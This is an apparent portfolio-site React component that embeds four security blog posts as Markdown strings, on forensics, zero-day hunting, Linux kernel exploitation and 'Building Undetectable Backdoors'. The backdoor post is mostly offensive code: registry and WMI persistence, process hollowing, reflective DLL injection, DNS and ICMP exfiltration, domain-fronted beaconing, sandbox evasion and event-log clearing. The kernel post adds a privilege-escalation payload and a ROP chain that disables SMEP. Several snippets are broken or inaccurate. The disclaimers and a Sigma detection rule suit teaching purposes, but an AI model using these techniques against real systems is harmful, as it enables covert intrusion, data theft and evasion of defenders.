import { X, Calendar, Clock, User, Terminal } from "lucide-react";

interface BlogPost {
  title: string;
  excerpt: string;
  category: string;
  readTime: string;
  status: string;
}

interface BlogDetailsModalProps {
  isOpen: boolean;
  onClose: () => void;
  blog: BlogPost | null;
}

export default function BlogDetailsModal({ isOpen, onClose, blog }: BlogDetailsModalProps) {
  if (!isOpen || !blog) return null;

  // Extended blog content based on the blog title
  const getBlogContent = (title: string) => {
    switch (title) {
      case "The Art of Digital Forensics":
        return {
          author: "Al Amin",
          date: "Aug 25, 2025",
          content: `
# Digital Forensics: Uncovering the Hidden Truth

## Introduction
Digital forensics is the science of uncovering and interpreting electronic data. In today's interconnected world, every digital action leaves a trace, and understanding how to follow these breadcrumbs is crucial for cybersecurity professionals.

## Memory Analysis Fundamentals

### Volatile Memory Examination
When a system is compromised, volatile memory contains the most recent state of the system. Tools like Volatility allow us to:

\`\`\`bash
volatility -f memory.dump --profile=Win10x64 pslist
volatility -f memory.dump --profile=Win10x64 netscan
volatility -f memory.dump --profile=Win10x64 malfind
\`\`\`

### Key Memory Artifacts
- **Process Lists**: Identify running and terminated processes
- **Network Connections**: Active and recent network activity
- **Registry Hives**: System configuration and user activity
- **Loaded Modules**: DLLs and drivers that may indicate malware

## File System Analysis

### Timeline Creation
Creating a comprehensive timeline helps establish the sequence of events:

\`\`\`bash
fls -r -m / /dev/sda1 > timeline.body
mactime -b timeline.body -d > timeline.csv
\`\`\`

### Deleted File Recovery
Even "deleted" files often remain recoverable:
- **File carving**: Recovering files based on headers/footers
- **Slack space analysis**: Data hiding in unused disk space
- **Journal analysis**: Filesystem transaction logs

## Network Forensics

### Packet Analysis
Wireshark and tcpdump are essential for network investigation:

\`\`\`bash
tcpdump -i eth0 -w capture.pcap
tshark -r capture.pcap -T fields -e ip.src -e ip.dst
\`\`\`

### Protocol Analysis
- **HTTP/HTTPS traffic**: Web browsing patterns
- **DNS queries**: Domain resolution history
- **Email protocols**: SMTP, POP3, IMAP communications

## Anti-Forensics Countermeasures

### Common Evasion Techniques
- **Timestomp**: Modifying file timestamps
- **Steganography**: Hiding data in images/media
- **Encryption**: Making data unreadable without keys
- **Data wiping**: Secure deletion of evidence

### Detection Methods
Experienced investigators know how to identify these techniques:
- Anomalous timestamp patterns
- Unusual file entropy indicating encryption
- Registry artifacts showing deleted applications
- Memory artifacts of anti-forensics tools

## Advanced Techniques

### Mobile Device Forensics
Modern investigations often involve smartphones:
- **Physical acquisition**: Bit-by-bit device imaging
- **Logical acquisition**: File system level extraction
- **Cloud artifacts**: Synced data analysis

### Container and VM Forensics
With virtualization everywhere:
- Docker container analysis
- Virtual machine snapshot examination
- Hypervisor log investigation

## Legal and Ethical Considerations

### Chain of Custody
Maintaining evidence integrity:
1. Proper documentation at each step
2. Hash verification of evidence
3. Secure storage and transport
4. Access logging and control

### Privacy Concerns
Balancing investigation needs with privacy rights:
- Scope limitation to relevant data
- Anonymization when possible
- Compliance with local laws

## Conclusion

Digital forensics is both an art and a science. While tools and techniques provide the technical foundation, experience and intuition guide investigators to uncover the truth hidden in digital evidence.

The key to successful digital forensics lies not just in knowing the tools, but understanding how systems work at a fundamental level and thinking like both the legitimate user and the potential attacker.

## References
- SANS Digital Forensics and Incident Response
- NIST SP 800-86: Guide to Integrating Forensic Techniques
- Volatility Foundation Documentation
- The Sleuth Kit User Guide
          `
        };
      case "Zero-Day Hunting Methodology":
        return {
          author: "Al Amin",
          date: "Aug 20, 2025",
          content: `
# Zero-Day Hunting: A Systematic Approach

## The Hunt Begins

Zero-day vulnerabilities represent the holy grail of security research - unknown flaws that attackers haven't yet discovered or that vendors haven't yet patched. Hunting these vulnerabilities requires a methodical approach combined with creative thinking.

## Target Selection

### High-Value Targets
- **Web browsers**: Chrome, Firefox, Safari, Edge
- **Operating systems**: Windows, macOS, Linux kernels
- **Network services**: SSH, HTTP servers, databases
- **Popular applications**: Media players, document viewers

### Selection Criteria
\`\`\`bash
# Example: Identifying high-impact targets
nmap -sV --top-ports 1000 target_network/24
shodan search "Apache 2.4" country:US
\`\`\`

## Static Analysis Phase

### Code Review Strategies
- **Pattern recognition**: Common vulnerability patterns
- **Input validation**: Analyzing user input handling
- **Memory management**: Buffer operations, allocations
- **Privilege handling**: Elevation and permission checks

### Tools and Techniques
\`\`\`c
// Example: Potential buffer overflow pattern
void vulnerable_function(char *user_input) {
    char buffer[256];
    strcpy(buffer, user_input);  // No bounds checking!
    process_data(buffer);
}
\`\`\`

## Dynamic Analysis

### Fuzzing Methodologies
Fuzzing remains one of the most effective discovery methods:

\`\`\`python
# Example AFL++ fuzzing setup
def setup_fuzzing():
    # Compile target with AFL instrumentation
    os.system("afl-gcc -o target target.c")

    # Create seed corpus
    create_seed_files()

    # Start fuzzing campaign
    os.system("afl-fuzz -i input/ -o output/ ./target @@")
\`\`\`

### Coverage-Guided Testing
- **AFL++**: Advanced fuzzing with coverage feedback
- **LibFuzzer**: In-process fuzzing for libraries
- **Honggfuzz**: Hardware-assisted fuzzing

## Vulnerability Analysis

### Root Cause Analysis
When crashes occur:
1. **Reproduce**: Consistently trigger the issue
2. **Isolate**: Minimize the test case
3. **Analyze**: Understand the underlying cause
4. **Exploit**: Develop proof-of-concept

### Exploitation Development
\`\`\`python
# Example: Basic buffer overflow exploit structure
payload = b"A" * offset
payload += p64(return_address)
payload += shellcode
\`\`\`

## Advanced Techniques

### Hybrid Analysis
Combining static and dynamic approaches:
- **Symbolic execution**: Tools like SAGE, KLEE
- **Concolic testing**: Concrete + symbolic execution
- **Model checking**: Formal verification methods

### Machine Learning Applications
- **Anomaly detection**: Identifying unusual code patterns
- **Vulnerability prediction**: ML models for bug discovery
- **Automated exploit generation**: AI-assisted exploitation

## Responsible Disclosure

### Disclosure Timeline
1. **Discovery**: Document the vulnerability
2. **Vendor contact**: Report through proper channels
3. **Coordination**: Work with vendor on fixes
4. **Public disclosure**: After patch availability

### Bug Bounty Programs
- **Scope understanding**: Know what's in/out of scope
- **Quality reports**: Clear, reproducible documentation
- **Communication**: Professional interaction with vendors

## Defensive Applications

### Threat Hunting
Use zero-day hunting skills defensively:
- **Proactive scanning**: Regular security assessments
- **Code auditing**: Internal application review
- **Patch prioritization**: Understanding exploit likelihood

### Security Tool Development
- Custom fuzzing harnesses
- Automated vulnerability scanners
- Exploit detection systems

## Case Studies

### Real-World Examples
- **CVE-2021-44228 (Log4Shell)**: Input validation failure
- **CVE-2020-1472 (Zerologon)**: Cryptographic weakness
- **CVE-2019-0708 (BlueKeep)**: Remote code execution

### Lessons Learned
Each discovery teaches valuable lessons:
- Common patterns across different software
- Vendor response variations
- Impact assessment accuracy

## Tools of the Trade

### Essential Software
\`\`\`bash
# Static analysis
cppcheck --enable=all source_code/
semgrep --config=auto source_code/

# Dynamic analysis
valgrind --tool=memcheck ./target
gdb -ex "set follow-fork-mode child" ./target

# Reverse engineering
objdump -d binary
radare2 binary
\`\`\`

## Conclusion

Zero-day hunting is equal parts science and art. While methodologies and tools provide structure, intuition and creativity often lead to the most significant discoveries.

The key is persistence - most research paths lead to dead ends, but the ones that don't can have major security implications. Every failed attempt teaches something valuable for the next investigation.

Remember: with great power comes great responsibility. Use these techniques ethically and always follow responsible disclosure practices.
          `
        };
      case "Linux Kernel Exploitation 101":
        return {
          author: "Al Amin",
          date: "Aug 15, 2025",
          content: `
# Linux Kernel Exploitation: From Theory to Practice

## Understanding the Kernel Attack Surface

The Linux kernel represents one of the most complex and critical attack surfaces in modern computing. Unlike userspace exploitation, kernel vulnerabilities can lead to complete system compromise, making them particularly valuable to both researchers and attackers.

## Kernel Architecture Overview

### Ring 0 vs Ring 3
- **Ring 3 (Userspace)**: Limited privileges, memory protection
- **Ring 0 (Kernel)**: Full system access, direct hardware control

### Key Components
\`\`\`c
// Simplified kernel structure
struct task_struct {
    pid_t pid;
    struct cred *cred;  // Process credentials
    struct mm_struct *mm;  // Memory management
    // ... many more fields
};
\`\`\`

## Common Vulnerability Classes

### Buffer Overflows
Kernel stack overflows can overwrite critical data:

\`\`\`c
// Vulnerable kernel function
static long vulnerable_ioctl(struct file *file,
                           unsigned int cmd,
                           unsigned long arg) {
    char buffer[256];
    copy_from_user(buffer, (void *)arg, 1024);  // Overflow!
    return 0;
}
\`\`\`

### Use-After-Free (UAF)
Memory corruption through dangling pointers:

\`\`\`c
// Example UAF scenario
struct vulnerable_object *obj = kmalloc(sizeof(*obj), GFP_KERNEL);
list_add(&obj->list, &global_list);
kfree(obj);  // Object freed
// Later...
obj->field = value;  // Use after free!
\`\`\`

### Race Conditions
Time-of-check vs time-of-use vulnerabilities:

\`\`\`c
// Race condition example
if (user_accessible(ptr)) {  // Check
    // Race window here!
    kernel_function(ptr);    // Use
}
\`\`\`

## Exploitation Techniques

### KASLR Bypass
Kernel Address Space Layout Randomization can be defeated:

\`\`\`bash
# Example: Information leak to defeat KASLR
dmesg | grep "Kernel offset"
cat /proc/kallsyms | head
\`\`\`

### SMEP/SMAP Bypass
- **SMEP**: Supervisor Mode Execution Prevention
- **SMAP**: Supervisor Mode Access Prevention

\`\`\`c
// ROP chain to disable SMEP/SMAP
unsigned long rop_chain[] = {
    pop_rdi_ret,         // ROP gadget
    0x406f8,             // CR4 value (SMEP/SMAP disabled)
    mov_cr4_rdi_ret,     // Write to CR4
    // ... continue payload
};
\`\`\`

### Privilege Escalation
The ultimate goal - gaining root privileges:

\`\`\`c
// Classic privilege escalation payload
void escalate_privileges(void) {
    struct cred *cred = prepare_creds();
    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    commit_creds(cred);
}
\`\`\`

## Modern Mitigation Techniques

### Control Flow Integrity (CFI)
- **kCFI**: Kernel Control Flow Integrity
- **Intel CET**: Control-flow Enforcement Technology

### Kernel Guard Technologies
\`\`\`bash
# Checking enabled mitigations
cat /proc/cmdline | grep -E "(smep|smap|kpti)"
dmesg | grep -i "randomize"
\`\`\`

### Stack Canaries
Stack protection in kernel space:

\`\`\`c
// Kernel stack canary check
void __stack_chk_fail(void) {
    panic("stack-protector: Kernel stack corrupted");
}
\`\`\`

## Exploitation Development Process

### 1. Vulnerability Research
\`\`\`bash
# Finding potential targets
git log --oneline --grep="fix\|CVE" linux/
syzkaller -config=kernel.cfg
\`\`\`

### 2. Proof of Concept Development
\`\`\`c
// Basic exploit template
#include <linux/module.h>
#include <linux/kernel.h>

static int __init exploit_init(void) {
    // Trigger vulnerability
    printk(KERN_INFO "Exploit loaded\\n");
    return 0;
}

static void __exit exploit_exit(void) {
    printk(KERN_INFO "Exploit unloaded\\n");
}

module_init(exploit_init);
module_exit(exploit_exit);
MODULE_LICENSE("GPL");
\`\`\`

### 3. Reliability Enhancement
- **Heap spraying**: Control kernel heap layout
- **Timing attacks**: Win race conditions reliably
- **Information leaks**: Defeat KASLR consistently

## Advanced Attack Vectors

### Kernel Object Reuse
Exploiting slab allocator behavior:

\`\`\`c
// Heap spray technique
for (int i = 0; i < 1000; i++) {
    spray_objects[i] = kmalloc(target_size, GFP_KERNEL);
    memset(spray_objects[i], 0x41, target_size);
}
\`\`\`

### Return-to-User (ret2usr)
Redirecting kernel execution to userspace:

\`\`\`c
// Userspace payload function
void userspace_payload(void) {
    setuid(0);
    setgid(0);
    execve("/bin/sh", NULL, NULL);
}
\`\`\`

### Dirty COW Style Attacks
Memory corruption through race conditions:

\`\`\`c
// Simplified dirty COW concept
while (1) {
    madvise(map, size, MADV_DONTNEED);
    write(fd, data, size);  // Race with COW
}
\`\`\`

## Defensive Programming

### Safe Coding Practices
\`\`\`c
// Secure copy operation
static inline int safe_copy_from_user(void *to,
                                     const void __user *from,
                                     unsigned long n) {
    if (n > MAX_ALLOWED_SIZE)
        return -EINVAL;
    return copy_from_user(to, from, n);
}
\`\`\`

### Static Analysis Integration
\`\`\`bash
# Kernel security checks
scripts/checkpatch.pl --file drivers/example.c
sparse drivers/example.c
\`\`\`

## Research Tools and Environments

### Kernel Debugging
\`\`\`bash
# QEMU debugging setup
qemu-system-x86_64 \\
    -kernel bzImage \\
    -initrd rootfs.cpio \\
    -gdb tcp::1234 \\
    -S

# GDB connection
gdb vmlinux
(gdb) target remote :1234
(gdb) continue
\`\`\`

### Fuzzing Frameworks
- **Syzkaller**: System call fuzzing
- **Trinity**: System call stress testing
- **KASAN**: Kernel address sanitizer

## Case Study: CVE-2022-0847 (Dirty Pipe)

This recent vulnerability demonstrates modern kernel exploitation:

\`\`\`c
// Simplified Dirty Pipe concept
struct pipe_buffer *buf = &pipe->bufs[tail & mask];
buf->ops = &anon_pipe_buf_ops;
buf->page = page;
buf->offset = 0;
buf->len = PAGE_SIZE;
buf->flags = PIPE_BUF_FLAG_CAN_MERGE;  // Key vulnerability
\`\`\`

## Conclusion

Kernel exploitation remains one of the most challenging areas of security research. Success requires:

1. **Deep system knowledge**: Understanding kernel internals
2. **Patience**: Kernel debugging is complex and time-consuming
3. **Creativity**: Finding novel attack vectors
4. **Responsibility**: Using knowledge ethically

The cat-and-mouse game between exploitation techniques and defensive measures continues to drive innovation in both offensive and defensive security research.

Remember: These techniques should only be used for legitimate security research, penetration testing with proper authorization, or educational purposes.
          `
        };
      case "Building Undetectable Backdoors":
        return {
          author: "Al Amin",
          date: "Aug 10, 2025",
          content: `
# Building Undetectable Backdoors: A Red Team Perspective

⚠️ **DISCLAIMER**: This content is for educational and authorized red team purposes only. Unauthorized use of these techniques is illegal and unethical.

## Introduction to Stealth Persistence

In red team operations and penetration testing, maintaining long-term access while remaining undetected is crucial. This article explores various persistence mechanisms and stealth techniques from a defensive perspective.

## Understanding Detection Mechanisms

### Traditional Indicators
Before building stealth mechanisms, understand what defenders look for:
- **File system artifacts**: Unusual files, timestamps
- **Registry modifications**: Startup entries, service registrations
- **Network signatures**: Unusual traffic patterns
- **Process behavior**: Memory injection, API hooking

### Modern Detection Technologies
\`\`\`bash
# EDR capabilities to evade
sysmon -c advanced_config.xml
winlogbeat -e -c winlogbeat.yml
osquery -S daemon
\`\`\`

## Persistence Techniques

### Registry-Based Persistence
\`\`\`python
# Example: Registry persistence (educational)
import winreg

def install_registry_persistence():
    key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0,
                        winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "SecurityUpdate", 0, winreg.REG_SZ,
                     r"C:\\Windows\\System32\\svchost.exe")
    winreg.CloseKey(key)
\`\`\`

### Service-Based Persistence
\`\`\`c
// Windows service persistence
SERVICE_TABLE_ENTRY ServiceTable[] = {
    {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
    {NULL, NULL}
};

BOOL StartServiceCtrlDispatcher(ServiceTable);
\`\`\`

### WMI Event Subscriptions
\`\`\`powershell
# Fileless WMI persistence
$Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE " +
         "TargetInstance ISA 'Win32_LogonSession'"

Register-WmiEvent -Query $Query -Action {
    # Backdoor payload here
    Start-Process "backdoor.exe" -WindowStyle Hidden
}
\`\`\`

## Anti-Forensics Techniques

### Timestamp Manipulation
\`\`\`python
# Timestomp implementation
import os
import win32file
import pywintypes

def modify_timestamps(filepath, creation_time, modify_time, access_time):
    handle = win32file.CreateFile(filepath,
                                 win32file.GENERIC_WRITE,
                                 0, None,
                                 win32file.OPEN_EXISTING,
                                 0, None)

    win32file.SetFileTime(handle, creation_time, access_time, modify_time)
    win32file.CloseHandle(handle)
\`\`\`

### Process Injection Techniques
\`\`\`c
// Process hollowing example
BOOL ProcessHollowing(LPCSTR targetPath, LPVOID payload, SIZE_T payloadSize) {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    // Create suspended process
    CreateProcess(targetPath, NULL, NULL, NULL, FALSE,
                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Unmap original image
    NtUnmapViewOfSection(pi.hProcess, imageBase);

    // Allocate new memory and write payload
    VirtualAllocEx(pi.hProcess, imageBase, payloadSize,
                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, imageBase, payload, payloadSize, NULL);

    // Resume execution
    ResumeThread(pi.hThread);
    return TRUE;
}
\`\`\`

### Memory-Only Execution
\`\`\`python
# Reflective DLL loading
def reflective_dll_injection(target_pid, dll_bytes):
    process = OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)

    # Allocate memory in target process
    remote_memory = VirtualAllocEx(process, None, len(dll_bytes),
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE)

    # Write DLL to remote memory
    WriteProcessMemory(process, remote_memory, dll_bytes, len(dll_bytes), None)

    # Execute reflective loader
    thread = CreateRemoteThread(process, None, 0, remote_memory, None, 0, None)
    WaitForSingleObject(thread, INFINITE)
\`\`\`

## Communication Channels

### DNS Tunneling
\`\`\`python
# Covert DNS communication
import dns.resolver
import base64

def dns_exfiltrate(data, domain):
    encoded_data = base64.b64encode(data).decode()
    chunks = [encoded_data[i:i+60] for i in range(0, len(encoded_data), 60)]

    for chunk in chunks:
        query = f"{chunk}.{domain}"
        try:
            dns.resolver.query(query, 'A')
        except:
            pass  # Expected to fail, data is in the query
\`\`\`

### HTTP(S) Beaconing
\`\`\`python
# Domain fronting technique
import requests

def beacon_home(data, front_domain, real_domain):
    headers = {
        'Host': real_domain,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    response = requests.post(f"https://{front_domain}/update",
                           data=data, headers=headers,
                           verify=False, timeout=10)
    return response.text
\`\`\`

### ICMP Tunneling
\`\`\`c
// Covert ICMP channel
void send_icmp_data(const char* target, const char* data) {
    SOCKET sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    ICMP_HEADER icmp_header;
    icmp_header.type = 8;  // Echo request
    icmp_header.code = 0;
    icmp_header.checksum = 0;
    icmp_header.id = getpid();

    // Embed data in ICMP payload
    memcpy(icmp_header.data, data, strlen(data));

    sendto(sock, &icmp_header, sizeof(icmp_header), 0,
           (struct sockaddr*)&target_addr, sizeof(target_addr));
}
\`\`\`

## Advanced Evasion Techniques

### API Hooking Detection Bypass
\`\`\`c
// Direct system call bypass
NTSTATUS NtCreateFile_Direct(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    // ... other parameters
) {
    __asm {
        mov eax, 0x55    // NtCreateFile syscall number
        mov edx, esp
        int 0x2e         // Direct syscall
    }
}
\`\`\`

### Sandbox Evasion
\`\`\`python
# Environment detection
def is_sandbox():
    checks = [
        lambda: os.path.exists("C:\\analysis"),
        lambda: "VMware" in os.environ.get("COMPUTERNAME", ""),
        lambda: psutil.virtual_memory().total < 2 * 1024**3,  # < 2GB RAM
        lambda: len(os.listdir("C:\\")) < 20,  # Minimal filesystem
    ]

    return sum(check() for check in checks) >= 2
\`\`\`

### Code Obfuscation
\`\`\`python
# String obfuscation example
def decrypt_string(encrypted_str, key):
    return ''.join(chr(ord(c) ^ key) for c in encrypted_str)

# Usage
api_name = decrypt_string("\\x1f\\x14\\x0c\\x1a\\x0f\\x04\\x1a", 0x42)  # "CreateFile"
\`\`\`

## Operational Security (OPSEC)

### Traffic Analysis Resistance
\`\`\`python
# Traffic pattern randomization
import random
import time

def random_beacon():
    # Randomize beacon intervals
    base_interval = 3600  # 1 hour base
    jitter = random.randint(-900, 900)  # ±15 minutes

    # Sleep variation
    time.sleep(base_interval + jitter)

    # Randomize user-agent strings
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        # ... more variants
    ]

    return random.choice(user_agents)
\`\`\`

### Log Evasion
\`\`\`powershell
# Windows Event Log manipulation
$logName = "Security"
$eventLog = Get-WinEvent -FilterHashtable @{LogName=$logName; ID=4624}

# Clear specific events (educational purposes)
wevtutil cl $logName
\`\`\`

## Detection and Mitigation

### Blue Team Countermeasures
\`\`\`yaml
# Sigma rule example for detection
title: Suspicious Registry Persistence
detection:
  selection:
    EventID: 13
    TargetObject: '*\\CurrentVersion\\Run\\*'
    Details: '*svchost.exe*'
  condition: selection
\`\`\`

### Behavioral Analysis
\`\`\`python
# Behavioral detection indicators
indicators = {
    'unusual_network_beaconing': True,
    'suspicious_process_injection': True,
    'abnormal_registry_modifications': True,
    'unexpected_file_access_patterns': True
}
\`\`\`

## Responsible Disclosure and Ethics

### Red Team Rules of Engagement
1. **Authorized testing only**: Written permission required
2. **Scope limitations**: Stay within defined boundaries
3. **Data protection**: Don't access/modify sensitive data
4. **Documentation**: Record all activities for debrief

### Educational Use Cases
- **Security training**: Teaching defensive techniques
- **Research purposes**: Understanding attack vectors
- **Penetration testing**: Authorized security assessments

## Conclusion

Understanding advanced persistence and evasion techniques is crucial for both red and blue teams. While these methods can be used maliciously, their primary value lies in:

1. **Improving defenses**: Know your enemy
2. **Security training**: Realistic attack simulations
3. **Research advancement**: Pushing security boundaries

### Key Takeaways
- **Defense in depth**: No single control is sufficient
- **Behavioral analysis**: Focus on actions, not just signatures
- **Continuous monitoring**: Persistent threats require persistent vigilance
- **Threat hunting**: Proactive detection capabilities

Remember: The goal of understanding these techniques is to build better defenses and train more effective security professionals. Use this knowledge responsibly and always within legal and ethical boundaries.

## References
- MITRE ATT&CK Framework: Persistence Techniques
- NIST Cybersecurity Framework
- Red Team Field Manual
- Blue Team Handbook
          `
        };
      default:
        return {
          author: "Al Amin",
          date: "Aug 31, 2025",
          content: "# Blog content not available\n\nThis blog post is currently being written. Check back soon for the full content!"
        };
    }
  };

  const blogData = getBlogContent(blog.title);

  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-gray-900 border border-green-400 rounded-lg w-full max-w-4xl max-h-[90vh] overflow-hidden shadow-2xl">
        {/* Terminal Header */}
        <div className="bg-black px-4 py-3 flex items-center justify-between border-b border-green-400/30">
          <div className="flex items-center space-x-3">
            <div className="flex space-x-2">
              <div className="w-3 h-3 bg-red-500 rounded-full"></div>
              <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
              <div className="w-3 h-3 bg-green-500 rounded-full"></div>
            </div>
            <div className="flex items-center space-x-2">
              <Terminal className="h-4 w-4 text-green-400" />
              <span className="text-green-400 font-mono text-sm">cat /blog/{blog.title.toLowerCase().replace(/\s+/g, '_')}.md</span>
            </div>
          </div>
          <button
            onClick={onClose}
            className="text-red-400 hover:text-red-300 transition-colors"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Blog Content */}
        <div className="overflow-y-auto max-h-[calc(90vh-60px)]">
          {/* Blog Header */}
          <div className="bg-gray-800 border-b border-gray-700 px-6 py-4">
            <div className="flex flex-wrap items-center gap-4 mb-3">
              <span className={`px-3 py-1 rounded text-xs font-bold ${
                blog.status === "Latest" ? "bg-red-500 text-white" :
                blog.status === "Popular" ? "bg-green-500 text-white" :
                blog.status === "Technical" ? "bg-blue-500 text-white" :
                "bg-purple-500 text-white"
              }`}>
                {blog.status}
              </span>
              <span className="bg-black border border-green-400 text-green-400 px-3 py-1 rounded text-xs">
                {blog.category}
              </span>
            </div>

            <h1 className="text-2xl font-bold text-white mb-3">{blog.title}</h1>

            <div className="flex flex-wrap items-center gap-4 text-sm text-gray-400 font-mono">
              <div className="flex items-center gap-1">
                <User className="h-4 w-4" />
                <span>{blogData.author}</span>
              </div>
              <div className="flex items-center gap-1">
                <Calendar className="h-4 w-4" />
                <span>{blogData.date}</span>
              </div>
              <div className="flex items-center gap-1">
                <Clock className="h-4 w-4" />
                <span>{blog.readTime} read</span>
              </div>
            </div>
          </div>

          {/* Blog Content */}
          <div className="p-6 bg-black text-green-400 font-mono">
            <div className="prose prose-invert prose-green max-w-none">
              <pre className="whitespace-pre-wrap text-sm leading-relaxed">
                {blogData.content}
              </pre>
            </div>
          </div>

          {/* Footer */}
          <div className="bg-gray-800 border-t border-gray-700 px-6 py-4">
            <div className="flex items-center justify-between">
              <span className="text-gray-400 text-sm font-mono">
                root@alamin:~# echo "End of file"
              </span>
              <button
                onClick={onClose}
                className="bg-gray-900 border border-red-400 text-red-400 px-4 py-2 rounded hover:bg-red-400 hover:text-black transition-all duration-300 font-mono text-sm"
              >
                ./close.sh
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
